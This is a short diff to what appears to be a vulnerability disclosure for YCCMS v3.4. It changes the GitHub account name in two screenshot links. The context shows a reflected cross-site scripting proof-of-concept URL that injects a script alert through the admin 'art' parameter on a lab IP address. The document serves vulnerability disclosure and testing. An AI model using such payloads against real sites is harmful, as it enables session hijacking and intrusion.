@@ -22,6 +22,6 @@ After the administrator logged in, write the POC as:
 
 `http://172.16.141.134/yccms-v3.4-free/admin/?a=html&m=arts&art=%3Cscript%3Ealert(/xss/);%3C/script%3E`  
 
-![](https://github.com/hellogoldsnakeman/vulnerable/blob/master/yccms/2.jpg)  
+![](https://github.com/xiaozhangming/vulnerable/blob/master/yccms/2.jpg)  
 
-![](https://github.com/hellogoldsnakeman/vulnerable/blob/master/yccms/3.jpg)  
+![](https://github.com/xiaozhangming/vulnerable/blob/master/yccms/3.jpg)  
